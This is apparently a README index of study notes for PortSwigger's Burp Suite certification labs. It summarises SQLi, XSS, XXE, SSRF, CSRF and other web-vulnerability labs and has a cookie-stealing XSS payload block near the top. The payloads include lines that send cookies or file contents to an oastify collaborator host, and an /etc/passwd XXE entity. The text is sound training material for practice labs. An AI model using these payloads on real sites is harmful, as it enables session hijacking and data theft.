# BSCP
This file consits of all labs with short decription of vulnerability and/or solution.

# PortSwigger Cheat Sheets
- [SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Obfuscating Payloads](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [URL Validation Bypass](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [Web cache deception delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
- [Usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
- [JWT Secrets](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)

# Custom Cheat Sheets
- [GraphQL - Cheat Sheet](/PortSwigger/Advanced_topics/GraphQL_API_vulnerabilities/GraphQL_cheat_sheet.md)
- [Server-side template injection - Cheat Sheet](/PortSwigger/Advanced_topics/Server-side_template_injection/SSTI_cheat_cheet.md)
- [HTTP request smuggling - Cheat Sheet](/PortSwigger/Advanced_topics/HTTP_request_smuggling/Request_smuggling_cheat_sheet.md)

```js
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
<img src="http://burp.oastify.com?c='+document.cookie+'" />
<img src=0 onerror="window.location='http://burp.oastify.com/c='+document.cookie"/>
fetch('http://burp.oastify.com?c='+btoa(document.cookie))
javascript:alert(document.cookie)
```



# Server Side vulnerabilities
## SQL injection
- [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](/PortSwigger/Server_Side/SQL_injection/SQL_injection_vulnerability_in_WHERE_clause_allowing_retrieval_of_hidden_data.md)
    - Modification of query logic by SQLi in `WHERE` statement
- [SQL injection vulnerability allowing login bypass](/PortSwigger/Server_Side/SQL_injection/SQL_injection_vulnerability_allowing_login_bypass.md)
    - Commenting out the rest of the query bypasses password verification
- [SQL injection attack, querying the database type and version on Oracle](/PortSwigger/Server_Side/SQL_injection/SQL_injection_attack,_querying_the_database_type_and_version_on_Oracle.md)
    - Retrieving version information via UNION attack in Oracle DB
- [SQL injection attack, querying the database type and version on Oracle](/PortSwigger/Server_Side/SQL_injection/SQL_injection_attack,_querying_the_database_type_and_version_on_MySQL_and_Microsoft.md)
    - Retrieving version information via UNION attack in MySQL and Microsoft DB
- [SQL injection attack, listing the database contents on non-Oracle databases](/PortSwigger/Server_Side/SQL_injection/SQL_injection_attack,_listing_the_database_contents_on_non-Oracle_databases.md)
    - Listing database contents via UNION attack in non-Oracle DB
- [SQL injection attack, listing the database contents on Oracle](/PortSwigger/Server_Side/SQL_injection/SQL_injection_attack,_listing_the_database_contents_on_Oracle.md)
    - Listing database contents via UNION attack in Oracle DB
- [SQL injection UNION attack, determining the number of columns returned by the query](/PortSwigger/Server_Side/SQL_injection/SQL_injection_UNION_attack,_determining_the_number_of_columns_returned_by_the_query.md)
    - UNION attack - determining the number of columns
- [SQL injection UNION attack, finding a column containing text](/PortSwigger/Server_Side/SQL_injection/SQL_injection_UNION_attack,_finding_a_column_containing_text.md)
    - UNION attack - finding_a_column_containing_text
- [SQL injection UNION attack, retrieving data from other tables](/PortSwigger/Server_Side/SQL_injection/SQL_injection_UNION_attack,_retrieving_data_from_other_tables.md)
    - UNION attack - retrieving_data
- [SQL injection UNION attack, retrieving multiple values in a single column](/PortSwigger/Server_Side/SQL_injection/SQL_injection_UNION_attack,_retrieving_multiple_values_in_a_single_column.md)
    - UNION attack - retrieving multiple values via concatenation
- [Blind SQL injection with conditional responses](/PortSwigger/Server_Side/SQL_injection/Blind_SQL_injection_with_conditional_responses.md)
    - SQLi in `TrackingId` cookie - data extraction based on conditional responses
    - Conditional SQLi payloads
- [Blind SQL injection with conditional errors](/PortSwigger/Server_Side/SQL_injection/Blind_SQL_injection_with_conditional_errors.md)
    - SQLi in `TrackingId` cookie - data extraction based on conditional_errors
    - Error triggering SQLi payloads (zero division etc.)
- [Visible error-based SQL injection](/PortSwigger/Server_Side/SQL_injection/Visible_error-based_SQL_injection.md)
    - SQLi in `TrackingId`- data extraction based on visible errors
- [Blind SQL injection with time delays](/PortSwigger/Server_Side/SQL_injection/Blind_SQL_injection_with_time_delays.md)
    - SQLi in `TrackingId`- Blind SQLi vulnerability identification
- [Blind SQL injection with time delays and information retrieval](/PortSwigger/Server_Side/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval.md)
    - SQLi in `TrackingId`- data extraction based on time delays
- [Blind SQL injection with out-of-band interaction](/PortSwigger/Server_Side/SQL_injection/Blind_SQL_injection_with_out-of-band_interaction.md)
    - SQLi in `TrackingId`- Out-of-band blind SQLi vulnerability identification
- [Blind SQL injection with out-of-band data exfiltration](/PortSwigger/Server_Side/SQL_injection/Blind_SQL_injection_with_out-of-band_data_exfiltration.md)
    - SQLi in `TrackingId`- Out-of-band data extraction via DNS
- [SQL injection with filter bypass via XML encoding](/PortSwigger/Server_Side/SQL_injection/SQL_injection_with_filter_bypass_via_XML_encoding.md)
    - SQLi in XML body with `<@hex_entities>` (Hackvertor)

## Authentication
- [Username enumeration via different responses](/PortSwigger/Server_Side/Authentication/Username_enumeration_via_different_responses.md)
    - Correct username identification via enumeration - different responses
- [2FA simple bypass](/PortSwigger/Server_Side/Authentication/2FA_simple_bypass.md)
    - Skipping second factor by jumping to next request
- [Password reset broken logic](/PortSwigger/Server_Side/Authentication/Password_reset_broken_logic.md)
    - Password-reset token is shared via different users
    - Password-reset token can be used multiple times
- [Username enumeration via subtly different responses](/PortSwigger/Server_Side/Authentication/Username_enumeration_via_subtly_different_responses.md)
    - Correct username identification via enumeration - subltly different responses
- [Username enumeration via response timing](/PortSwigger/Server_Side/Authentication/Username_enumeration_via_response_timing.md)
    - Correct username identification via enumeration - response timing
- [Broken brute-force protection, IP block](/PortSwigger/Server_Side/Authentication/Broken_brute-force_protection,_IP_block.md)
    - Bypass brute-force protection by alternating successful and failed (brute-force) login attempts
- [Username enumeration via account lock](/PortSwigger/Server_Side/Authentication/Username_enumeration_via_account_lock.md)
    - Correct username identification via enumeration - account lock
- [2FA broken logic](/PortSwigger/Server_Side/Authentication/2FA_broken_logic.md)
    - Skipping secfirst factor and brute-forcing second factor
- [Brute-forcing a stay-logged-in cookie](/PortSwigger/Server_Side/Authentication/Brute-forcing_a_stay-logged-in_cookie.md)
    - Vulnerable structure of `stay-logged-in cookie` - cookie brute force
- [Offline password cracking](/PortSwigger/Server_Side/Authentication/Offline_password_cracking.md)
    - Vulnerable structure of `stay-logged-in cookie`
    - Stealing user cookie via XSS and brute-forcing password
- [Password reset poisoning via middleware](/PortSwigger/Server_Side/Authentication/Password_reset_poisoning_via_middleware.md)
    - Using `X-Forwarded-Host` header to create forgot password link with other domain
- [Password brute-force via password change](/PortSwigger/Server_Side/Authentication/Password_brute-force_via_password_change.md)
    - Correct username identification via change password functionality
    - Bypass brute-force protection by providing non matching new passwords.

## Path Traversal
- [File path traversal, simple case](/PortSwigger/Server_Side/Path_Traversal/File_path_traversal,_simple_case.md)
    - Path traversal in `/image?filename=...` (realtive path)
- [File path traversal, traversal sequences blocked with absolute path bypass](/PortSwigger/Server_Side/Path_Traversal/File_path_traversal,_traversal_sequences_blocked_with_absolute_path_bypass.md)
    - Path traversal in `/image?filename=...` (absolute path)
- [File path traversal, traversal sequences stripped non-recursively](/PortSwigger/Server_Side/Path_Traversal/File_path_traversal,_traversal_sequences_stripped_non-recursively.md)
    - Path traversal in `/image?filename=...` (no recursive stripping of `../`)
- [File path traversal, traversal sequences stripped with superfluous URL-decode](/PortSwigger/Server_Side/Path_Traversal/File_path_traversal,_traversal_sequences_stripped_with_superfluous_URL-decode.md)
    - Path traversal in `/image?filename=...` (doble URL encoding)
- [File path traversal, validation of start of path](/PortSwigger/Server_Side/Path_Traversal/File_path_traversal,_validation_of_start_of-path.md)
    - Path traversal in `/image?filename=...` (only initial path is validated)
- [File path traversal, validation of file extension with null byte bypass](/PortSwigger/Server_Side/Path_Traversal/File_path_traversal,_validation_of_file_extension_with_null_byte_bypass.md)
    - Path traversal in `/image?filename=...` (only extention is validaded) - bypass via `%00.png`

## OS command injection
- [OS command injection, simple case](/PortSwigger/Server_Side/OS_command_injection/OS_command_injection,_simple_case.md)
    - Os command injection in `storeid` via `&`
- [Blind OS command injection with time delays](/PortSwigger/Server_Side/OS_command_injection/Blind_OS_command_injection_with_time_delays.md)
    - Os command injection in `storeid` via `&` - identification via time delays
- [Blind OS command injection with output redirection](/PortSwigger/Server_Side/OS_command_injection/Blind_OS_command_injection_with_output_redirection.md)
    - Os command injection in `email` via `||` with output redirection to a file
    - Reading created file via path traversal in `/image?filename=...`
- [Blind OS command injection with out-of-band interaction](/PortSwigger/Server_Side/OS_command_injection/Blind_OS_command_injection_with_out-of-band_interaction.md)
    - Os command injection in `email` via \`\` - identification via out-of-band interaction
- [Blind OS command injection with out-of-band data exfiltration](/PortSwigger/Server_Side/OS_command_injection/Blind_OS_command_injection_with_out-of-band_data_exfiltration.md)
    - Os command injection in `storeid` via \`\` - out-of-band data exfiltration via DNS

## Business logic vulnerabilities
- [Excessive trust in client-side controls](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Excessive_trust_in_client-side_controls.md)
    - Modification of price via client-side `price` parameter
- [High-level logic vulnerability](/PortSwigger/Server_Side/Business_logic_vulnerabilities/High-level_logic_vulnerability.md)
    - Modification of quantity via client-side `quantity` parameter - negative quantity
- [Inconsistent security controls](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Inconsistent_security_controls.md)
    - Modification of `email` after registration - privilege escalation
- [Flawed enforcement of business rules](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Flawed_enforcement_of_business_rules.md)
    - Coupon abuse via alternating 2 different coupons
- [Low-level logic flaw](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Low-level_logic_flaw.md)
    - Modification of quantity via client-side `quantity` parameter - integer overflow
- [Inconsistent handling of exceptional input](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Inconsistent_handling_of_exceptional_input.md)
    - Modification of `email` after registration - too long email truncation
- [Weak isolation on dual-use endpoint](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Weak_isolation_on_dual-use_endpoint.md)
    - Abusing password change - skipping `current-password` in change password request
- [Insufficient workflow validation](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Insufficient_workflow_validation.md)
    -  Lack of checkout sequence (steps) validation - triggering final checkout request
- [Authentication bypass via flawed state machine](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Authentication_bypass_via_flawed_state_machine.md)
    - Lack of checkout sequence (steps) validation - skipping role selector request
- [Infinite money logic flaw](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Infinite_money_logic_flaw.md)
    - Infinite money logic flaw
- [Authentication bypass via encryption oracle](/PortSwigger/Server_Side/Business_logic_vulnerabilities/Authentication_bypass_via_encryption_oracle.md)
    - Providing invalid email allows to get encrypted string
    - Cookie `stay-logged-in` can be used by attacker to entryption 
    - Cookie `notification` can be used by attacker to decryption (of `stay-logged-in`)

## Information disclosure vulnerabilities
- [Information disclosure in error messages](/PortSwigger/Server_Side/Information_disclosure/Information_disclosure_in_error_messages.md)
    - Errors pages leaks sensitive information
- [Information disclosure on debug page](/PortSwigger/Server_Side/Information_disclosure/Information_disclosure_on_debug_page.md)
    - Debug pages (comments) leaks sensitive information
- [Source code disclosure via backup files](/PortSwigger/Server_Side/Information_disclosure/Source_code_disclosure_via_backup_files.md)
    - Backup files (visible for example in `robots.txt`) leaks sensitive information
- [Authentication bypass via information disclosure](/PortSwigger/Server_Side/Information_disclosure/Authentication_bypass_via_information_disclosure.md)
    - Authentication bypass via `X-Custom-IP-Authorization: 127.0.0.1` header
- [Information disclosure in version control history](/PortSwigger/Server_Side/Information_disclosure/Information_disclosure_in_version_control_history.md)
    - Directory `.git` leaks sensitive information

## Access control
- [Unprotected admin functionality](/PortSwigger/Server_Side/Access_control_vulnerabilities/Unprotected_admin_functionality.md)
    - Unprotected admin endpoint listed in `robots.txt`
- [Unprotected admin functionality with unpredictable URL](/PortSwigger/Server_Side/Access_control_vulnerabilities/Unprotected_admin_functionality_with_unpredictable_URL.md)
    - Unprotected, unpredictable admin endpoint visible in source code
- [User role controlled by request parameter](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_role_controlled_by_request_parameter.md)
    - Admin access controlled by boolean cookie value
- [User role can be modified in user profile](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_role_can_be_modified_in_user_profile.md)
    - User role controlled via client-side `roleid` parameter
- [User ID controlled by request parameter](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_ID_controlled_by_request_parameter.md)
    - User ID id controlled by `id` request parameter
- [User ID controlled by request parameter, with unpredictable user IDs](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_ID_controlled_by_request_parameter,_with_unpredictable_user_IDs.md)
    - User ID controlled id by unpredictable `id` request parameter (`GUID`)
    - Unpredictable IDs are leaked in blog author - `/blog/userid=<GUID>`
- [User ID controlled by request parameter with data leakage in redirect](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_ID_controlled_by_request_parameter_with_data_leakage_in_redirect.md)
    - User ID id controlled by `id` request parameter
    - Redirect pages leaks sensitive information
- [User ID controlled by request parameter with password disclosure](/PortSwigger/Server_Side/Access_control_vulnerabilities/User_ID_controlled_by_request_parameter_with_password_disclosure.md)
    - User ID id controlled by `id` request parameter
    - Page leaks sensitive information
- [Insecure direct object references](/PortSwigger/Server_Side/Access_control_vulnerabilities/Insecure_direct_object_references.md)
    - Insecure direct object references
- [URL-based access control can be circumvented](/PortSwigger/Server_Side/Access_control_vulnerabilities/URL-based_access_control_can_be_circumvented.md)
    - Using `X-Original-URL` / `X-Rewrite-URL` header allows to access admin endpoint
- [Method-based access control can be circumvented](/PortSwigger/Server_Side/Access_control_vulnerabilities/Method-based_access_control_can_be_circumvented.md)
    - Roles modification via `/admin-roles` endpoint
- [Multi-step process with no access control on one step](/PortSwigger/Server_Side/Access_control_vulnerabilities/Multi_step_process_with_no_access_control_on_one_step.md)
    - Lack of sequence (steps) validation - triggering final upgrade role request
- [Referer-based access control](/PortSwigger/Server_Side/Access_control_vulnerabilities/Referer-based_access_control.md)
    - Using `Referer: https://.../admin` header allows to upgrade user role

## File upload vulnerabilities
- [Remote code execution via web shell upload](/PortSwigger/Server_Side/File_upload_vulnerabilities/Remote_code_execution_via_web_shell_upload.md)
    - Uploading PHP web shell allows to execute code
- [Web shell upload via Content-Type restriction bypass](/PortSwigger/Server_Side/File_upload_vulnerabilities/Web_shell_upload_via_Content_Type_restriction_bypass.md)
    - Uploading PHP web shell allows to execute code
    - Upload restriction can be bypassed by using `Content-Type: image/jpeg` with php file
- [Web shell upload via path traversal](/PortSwigger/Server_Side/File_upload_vulnerabilities/Web_shell_upload_via_path_traversal.md)
    - Uploading PHP web shell allows to execute code
    - Using path traversal allows to trigger uploaded php file
- [Web shell upload via extension blacklist bypass](/PortSwigger/Server_Side/File_upload_vulnerabilities/Web_shell_upload_via_extension_blacklist_bypass.md)
    - Uploading PHP web shell with alternative extensions allows to execute code
- [Web shell upload via obfuscated file extension](/PortSwigger/Server_Side/File_upload_vulnerabilities/Web_shell_upload_via_obfuscated_file_extension.md)
    - Uploading PHP web shell with obufscated extension allows to execute code
- [Remote code execution via polyglot web shell upload](/PortSwigger/Server_Side/File_upload_vulnerabilities/Remote_code_execution_via_polyglot_web_shell_upload.md)
    - Uploading Polyglot PHP payload allows to execute code
- [Web shell upload via race condition](/PortSwigger/Server_Side/File_upload_vulnerabilities/Web_shell_upload_via_race_condition.md)
    - Exploiting race conditions to trigger uploaded PHP payload before its deletion by AV

## Race conditions
- [Limit overrun race conditions](/PortSwigger/Server_Side/Race_Conditions/Limit_overrun_race_conditions.md)
    - Coupon abuse by sending multiple redeem requests with the same coupon in parallel
- [Bypassing rate limits via race conditions](/PortSwigger/Server_Side/Race_Conditions/Bypassing_rate_limits_via_race_conditions.md)
    - Exploting race conditions to bypass login page rate limits
- [Multi-endpoint race conditions](/PortSwigger/Server_Side/Race_Conditions/Multi-endpoint_race_conditions.md)
    - Exploting race conditions to trigger different actions on different endpoints
    - Triggering "checkout" along with "add new item to cart" allows to sneak extra item
- [Single-endpoint race conditions](/PortSwigger/Server_Side/Race_Conditions/Single-endpoint_race_conditions.md)
    - Exploting race conditions to hijack another user account
    - Triggering change email with attacker and victim email allows to receive victim's confirmation email 
- [Exploiting time-sensitive vulnerabilities](/PortSwigger/Server_Side/Race_Conditions/Exploiting_time-sensitive_vulnerabilities.md)
    - Exploting race conditions to hijack another user account
    - Reset passwords tokens are generated based on time
    - Triggering reset passowrd for attacker and victim at the same time, generates the same token 

## Server-side request forgery
- [Basic SSRF against the local server](/PortSwigger/Server_Side/SSRF/Basic_SSRF_against_the_local_server.md)
    - SSRF via `stockApi`allows to access admin endpoint located at `http://localhost/` 
- [Basic SSRF against another back-end system](/PortSwigger/Server_Side/SSRF/Basic_SSRF_against_another_back-end_system.md)
    - SSRF via `stockApi`allows to access admin endpoint located at specific private IP
- [Blind SSRF with out-of-band detection](/PortSwigger/Server_Side/SSRF/Blind_SSRF_with_out-of-band_detection.md)
    - SSRF via `Referer` header
- [SSRF with blacklist-based input filter](/PortSwigger/Server_Side/SSRF/SSRF_with_blacklist-based_input_filter.md)
    - SSRF via `stockApi`allows to access admin endpoint located at `http://localhost/` 
    - Using alternative `localhost` representations allow to bypass filters
- [SSRF with filter bypass via open redirection vulnerability](/PortSwigger/Server_Side/SSRF/SSRF_with_filter_bypass_via_open_redirection_vulnerability.md)
    - Open redirect in `/product/NextProduct?path=...` allows to bypass SSRF filter
    - SSRF via `stockApi` to access admin endpoint located at specific private IP

## XML external entity (XXE) injection
- [Exploiting XXE using external entities to retrieve files](/PortSwigger/Server_Side/XXE_Injection/Exploiting_XXE_using_external_entities_to_retrieve_files.md)
    - Using `<!ENTITY xxe SYSTEM "file:///etc/passwd">` allows to retrieve files
- [Exploiting XXE to perform SSRF attacks](/PortSwigger/Server_Side/XXE_Injection/Exploiting_XXE_to_perform_SSRF_attacks.md)
    - Using `<!ENTITY xxe SYSTEM "http://...">` allows to exploit SSRF
- [Blind XXE with out-of-band interaction](/PortSwigger/Server_Side/XXE_Injection/Blind_XXE_with_out-of-band_interaction.md)
    - Using `<!ENTITY xxe SYSTEM "http://...">` allows to identify out-of-band interaction
- [Blind XXE with out-of-band interaction via XML parameter entities](/PortSwigger/Server_Side/XXE_Injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities.md)
    - Using `<!ENTITY % xxe SYSTEM "http://..."> %xxe;` allows to identify out-of-band interaction
- [Exploiting blind XXE to exfiltrate data using a malicious external DTD](/PortSwigger/Server_Side/XXE_Injection/Exploiting_blind_XXE_to_exfiltrate_data_using_a_malicious_external_DTD.md)
    - Using `<!ENTITY % xxe SYSTEM "http://.../malicious.dtd"> %xxe;` to load malicious DTD
    - Exfiltrate data via `<!ENTITY &#x25; exfiltrate SYSTEM 'http://<id>.oastify.com/?x=%file;'>`
- [Exploiting blind XXE to retrieve data via error messages](/PortSwigger/Server_Side/XXE_Injection/Exploiting_blind_XXE_to_retrieve_data_via_error_messages.md)
    - Using `<!ENTITY % xxe SYSTEM "http://.../malicious.dtd"> %xxe;` to load malicious DTD
    - Placing leaked data in the file path allows to access the content of the file in error message
- [Exploiting XInclude to retrieve files](/PortSwigger/Server_Side/XXE_Injection/Exploiting_XInclude_to_retrieve_files.md)
    - Using `XInclude` in `x-www-form-urlencoded` request allows to retrieve files
- [Exploiting XXE via image file upload](/PortSwigger/Server_Side/XXE_Injection/Exploiting_XXE_via_image_file_upload.md)
    - Using malicious `.svg` files allows to retrieve files
- [Exploiting XXE to retrieve data by repurposing a local DTD](/PortSwigger/Server_Side/XXE_Injection/Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD.md)
    - Repurposing a local DTD allows to retrive files

## NoSQL injection
- [Detecting NoSQL injection](/PortSwigger/Server_Side/NoSQL_injection/Detecting_NoSQL_injection.md)
    - Ways of detecting NoSQL injection
- [Exploiting NoSQL operator injection to bypass authentication](/PortSwigger/Server_Side/NoSQL_injection/Exploiting_NoSQL_operator_injection_to_bypass_authentication.md)
    - Using `$regex` and `$ne` allows to bypass authentication
- [Exploiting NoSQL injection to extract data](/PortSwigger/Server_Side/NoSQL_injection/Exploiting_NoSQL_injection_to_extract_data.md)
    - Using conditional payloads to extract data
- [Exploiting NoSQL operator injection to extract unknown fields](/PortSwigger/Server_Side/NoSQL_injection/Exploiting_NoSQL_operator_injection_to_extract_unknown_fields.md)
    - Using `$where` operator to extract data

## API testing
- [Exploiting an API endpoint using documentation](/PortSwigger/Server_Side/API_testing/Exploiting_an_API_endpoint_using_documentation.md)
    - Exploiting API by having access to documentation information
- [Exploiting server-side parameter pollution in a query string](/PortSwigger/Server_Side/API_testing/Exploiting_server_side_parameter_pollution_in_a_query_string.md)
    - Manipulation of query string allows to leak reset password token
- [Finding and exploiting an unused API endpoint](/PortSwigger/Server_Side/API_testing/Finding_and_exploiting_an_unused_API_endpoint.md)
    - Using specific method on unsued endpoint allows to modify price of an item
- [Exploiting a mass assignment vulnerability](/PortSwigger/Server_Side/API_testing/Exploiting_a_mass_assignment_vulnerability.md)
    - Using `ParamMiner` allows to find hidden parameters
    - Using extra parameters allows to aply discount

## Web cache deception
- [Exploiting path mapping for web cache deception](/PortSwigger/Server_Side/Web_cache_deception/Exploiting_path_mapping_for_web_cache_deception.md)
    - Using `/my-account/test.js` allows to cache victim's response
- [Exploiting path delimiters for web cache deception](/PortSwigger/Server_Side/Web_cache_deception/Exploiting_path_delimiters_for_web_cache_deception.md)
    - Performing delimeter enumeration to find path delimiters
    - Using `/my-account;test.js` allows to cache victim's response
- [Exploiting origin server normalization for web cache deception](/PortSwigger/Server_Side/Web_cache_deception/Exploiting_origin_server_normalization_for_web_cache_deception.md)
    - Detecting URL normalization discrepancies
    - Using `/resources/..%2fmy-account` allows to cache victim's response
- [Exploiting cache server normalization for web cache deception](/PortSwigger/Server_Side/Web_cache_deception/Exploiting_cache_server_normalization_for_web_cache_deception.md)
    - Detecting URL normalization discrepancies
    - Performing delimeter enumeration to find path delimiters
    - Using `/my-account#/../resources/css/labs.css` allows to cache victim's response
- [Exploiting exact-match cache rules for web cache deception](/PortSwigger/Server_Side/Web_cache_deception/Exploiting_exact-match_cache_rules_for_web_cache_deception.md)
    - Detecting URL normalization discrepancies - origin server normalization vs cache server normalization
    - Using `/my-account;/../robots.txt?cachebuster` allows to cache victim's response with CSRF token
    - Using stolen CSRF token to change victim's email











# Client-Side Topics
## Cross-site scripting (XXS)

- [Reflected XSS into HTML context with nothing encoded](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_HTML_context_with_nothing_encoded.md)
    - Basic ReflectedXSS in search functionality - `<script>alert()</script>`
- [Stored XSS into HTML context with nothing encoded](/PortSwigger/Client_Side/XSS/Stored_XSS_into_HTML_context_with_nothing_encoded.md)
    - Basic Stored XSS in search comment functionality - `<script>alert()</script>`
- [DOM XSS in document.write sink using source location.search](/PortSwigger/Client_Side/XSS/DOM_XSS_in_document.write_sink_using_source_location.search.md)
    - Source `location.search`
    - Sink `document.write`
    - Basic DOM XSS - `sth" onload="alert()`
- [DOM XSS in innerHTML sink using source location.search](/PortSwigger/Client_Side/XSS/DOM_XSS_in_innerHTML_sink_using_source_location.search.md)
    - Source `location.search`
    - Sink `innerHTML`
    - DOM XSS - `<img src='0' onerror='alert()'>`
- [DOM XSS in jQuery anchor href attribute sink using location.search source](/PortSwigger/Client_Side/XSS/DOM_XSS_in_jQuery_anchor_href_attribute_sink_using_location.search_source.md)
    - Source `location.search`
    - Sink `jQuery anchor href`
    - DOM XSS - `/feedback?returnPath=javascript:alert('back')`
- [DOM XSS in jQuery selector sink using a hashchange event](/PortSwigger/Client_Side/XSS/DOM_XSS_in_jQuery_selector_sink_using_a_hashchange_event.md)
    - Source `hashchange event`
    - Sink `jQuery selector`
    - DOM XSS - `/#<img src=0 onerror='alert()'>`
- [Reflected XSS into attribute with angle brackets HTML-encoded](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_attribute_with_angle_brackets_HTML-encoded.md)
    - Reflected XSS - `/?search=Payload "onmouseover="alert()`
- [Stored XSS into anchor href attribute with double quotes HTML-encoded](/PortSwigger/Client_Side/XSS/Stored_XSS_into_anchor_href_attribute_with_double_quotes_HTML-encoded.md)
    - Stored XSS in `href` - `javascript:alert()`
- [Reflected XSS into a JavaScript string with angle brackets HTML encoded](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_a_JavaScript_string_with_angle_brackets_HTML_encoded.md)
    - Reflected XSS - `';alert()//`
- [DOM XSS in document.write sink using source location.search inside a select element](/PortSwigger/Client_Side/XSS/DOM_XSS_in_document.write_sink_using_source_location.search_inside_a_select_element.md)
    - Source `location.search`
    - Sink `document.write`
    - DOM XSS - `/product?productId=1&storeId=</option> </select> <img src="0" onerror="alert()">`
- [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](/PortSwigger/Client_Side/XSS/DOM_XSS_in_AngularJS_expression_with_angle_brackets_and_double_quotes_HTML-encoded.md)
    - Test - `/?search={{ 2 + 2 }}`
    - DOM XSS - `/?search={{ $eval.constructor('alert()')() }}`
- [Reflected DOM XSS](/PortSwigger/Client_Side/XSS/Reflected_DOM_XSS.md)
    - Source `location.search`
    - Sink `eval`
    - Reflected DOM XSS - `/?search=\"-alert()}//`
- [Stored DOM XSS](/PortSwigger/Client_Side/XSS/Stored_DOM_XSS.md)
    - Stored DOM XSS - `<><img src=0 onerror='alert()'>`
- [Reflected XSS into HTML context with most tags and attributes blocked](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_HTML_context_with_most_tags_and_attributes_blocked.md)
    - Brute forcing allowed tags
    - Brute forcing allowed events
    - Reflected XSS - `<body onresize='print()'>`
- [Reflected XSS into HTML context with all tags blocked except custom ones](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_HTML_context_with_all_tags_blocked_except_custom_ones.md)
    - Reflected XSS - `/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x`
- [Reflected XSS with some SVG markup allowed](/PortSwigger/Client_Side/XSS/Reflected_XSS_with_some_SVG_markup_allowed.md)
    - Brute forcing allowed tags
    - Brute forcing allowed events
    - Reflected XSS - `/?search=<svg><animatetransform onbegin="alert()">`
- [Reflected XSS in canonical link tag](/PortSwigger/Client_Side/XSS/Reflected_XSS_in_canonical_link_tag.md)
    - Reflected XSS - `/?'%09onclick='alert()'%09accesskey='x`
- [Reflected XSS into a JavaScript string with single quote and backslash escaped](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_a_JavaScript_string_with_single_quote_and_backslash_escaped.md)
    - Reflected XSS - `/?search=</script> <script>alert()//`
- [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_a_JavaScript_string_with_angle_brackets_and_double_quotes_HTML-encoded_and_single_quotes_escaped.md)
    - Reflected XSS - `/?search=\' - alert()//`
- [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](/PortSwigger/Client_Side/XSS/Stored_XSS_into_onclick_event_with_angle_brackets_and_double_quotes_HTML-encoded_and_single_quotes_and_backslash_escaped.md)
    - Stored XSS - `https://example.com/&apos;-alert()-&apos;`
- [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](/PortSwigger/Client_Side/XSS/Reflected_XSS_into_a_template_literal_with_angle_brackets,_single,_double_quotes,_backslash_and_backticks_Unicode-escaped.md)
    - Reflected XSS - `/?search=${alert()}`
- [Exploiting cross-site scripting to steal cookies](/PortSwigger/Client_Side/XSS/Exploiting_cross-site_scripting_to_steal_cookies.md)
    - Stored XSS allows to leak user's cookies
- [Exploiting cross-site scripting to capture passwords](/PortSwigger/Client_Side/XSS/Exploiting_cross-site_scripting_to_capture_passwords.md)
    - Stored XSS allows to leak user's credentials - user have auto-fill enabled
- [Exploiting XSS to perform CSRF](/PortSwigger/Client_Side/XSS/Exploiting_XSS_to_perform_CSRF.md)
    - Stored XSS allows to send change email request
- [Reflected XSS protected by very strict CSP, with dangling markup attack](/PortSwigger/Client_Side/XSS/Reflected_XSS_protected_by_very_strict_CSP,_with_dangling_markup_attack.md)
    - Reflected XSS allows to steal CSRF via `<button formaction="https://<id>.oastify.com/exploit" formmethod="get">Click me</button`
    - Using stolen CSRF token to change user's email 

## Cross-site request forgery (CSRF)
- [CSRF vulnerability with no defenses](/PortSwigger/Client_Side/CSRF/CSRF_vulnerability_with_no_defenses.md)
    - CSRF with no protections
- [CSRF where token validation depends on request method](/PortSwigger/Client_Side/CSRF/CSRF_where_token_validation_depends_on_request_method.md)
    - Using `GET` method instead of `POST` results in CSRF token not being verified
- [CSRF where token validation depends on token being present](/PortSwigger/Client_Side/CSRF/CSRF_where_token_validation_depends_on_token_being_present.md)
    - Lack of CSRF token results in valid request
- [CSRF where token is not tied to user session](/PortSwigger/Client_Side/CSRF/CSRF_where_token_is_not_tied_to_user_session.md)
    - Attacker can use his own CSRF token with victim's request
- [CSRF where token is tied to non-session cookie](/PortSwigger/Client_Side/CSRF/CSRF_where_token_is_tied_to_non-session_cookie.md)
    - Using cookie injection to set correct CSRF token in victim's browser
- [CSRF where token is duplicated in cookie](/PortSwigger/Client_Side/CSRF/CSRF_where_token_is_duplicated_in_cookie.md)
    - Using cookie injection to set correct CSRF token in victim's browser
- [SameSite Lax bypass via method override](/PortSwigger/Client_Side/CSRF/SameSite_Lax_bypass_via_method_override.md)
